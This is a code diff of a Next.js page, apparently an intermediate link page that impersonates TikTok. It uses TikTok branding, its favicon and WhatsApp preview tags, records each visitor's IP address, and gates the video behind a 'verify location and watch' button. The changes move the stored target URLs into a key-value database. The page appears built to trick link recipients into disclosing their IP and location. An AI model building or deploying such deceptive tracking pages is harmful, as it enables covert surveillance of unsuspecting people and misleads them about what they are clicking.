@@ -1,29 +1,25 @@
 import Head from 'next/head';
 import { useState } from 'react';
+import { kv } from '@vercel/kv';
 
 export async function getServerSideProps({ params, req }) {
-  let tiktokUrl = '';
-  
+  // Ambil URL asli dari Database berdasarkan ID
+  let data = null;
   try {
-    // Bongkar Base64 jadi URL asli
-    tiktokUrl = Buffer.from(params.id, 'base64url').toString('utf-8');
-    if (!tiktokUrl.startsWith('http')) throw new Error('Invalid URL');
+    data = await kv.get(params.id);
   } catch (e) {
-    return { notFound: true };
+    console.error("KV Error:", e);
   }
 
-  // Ambil meta untuk preview WhatsApp
-  let meta = {};
-  try {
-    const r = await fetch(`https://www.tiktok.com/oembed?url=${encodeURIComponent(tiktokUrl)}`);
-    if (r.ok) meta = await r.json();
-  } catch (e) {}
+  if (!data || !data.url) {
+    return { notFound: true };
+  }
 
   let ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
   if (ip.includes(',')) ip = ip.split(',')[0].trim();
   ip = ip.replace('::ffff:', '');
 
-  return { props: { url: tiktokUrl, meta, serverIp: ip } };
+  return { props: { url: data.url, meta: data.meta || {}, serverIp: ip } };
 }
 
 export default function Intermediate({ url, meta, serverIp }) {
@@ -75,14 +71,11 @@ export default function Intermediate({ url, meta, serverIp }) {
       <Head>
         <title>{previewTitle}</title>
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
-        
-        {/* META TAGS WA */}
         <meta property="og:type" content="video.other" />
         <meta property="og:site_name" content="TikTok" />
         <meta property="og:title" content={previewTitle} />
         <meta property="og:description" content="Klik untuk menonton video ini di TikTok." />
         <meta property="og:image" content={previewImage} />
-        
         <link rel="icon" href="https://www.tiktok.com/favicon.ico" />
       </Head>
 
@@ -129,27 +122,13 @@ export default function Intermediate({ url, meta, serverIp }) {
               display: 'flex',
               alignItems: 'center',
               justifyContent: 'center',
-              gap: '8px',
-              transition: 'background-color 0.2s ease'
+              gap: '8px'
             }}
           >
-            {loading ? (
-              <>
-                <svg style={{ animation: 'spin 1s linear infinite' }} width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#888" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                  <path d="M21 12a9 9 0 1 1-6.219-8.56" />
-                </svg>
-                {statusText}
-              </>
-            ) : (
-              'Verifikasi Lokasi & Tonton'
-            )}
+            {loading ? statusText : 'Verifikasi Lokasi & Tonton'}
           </button>
         </div>
       </div>
-      
-      <style>{`
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-      `}</style>
     </>
   );
 }
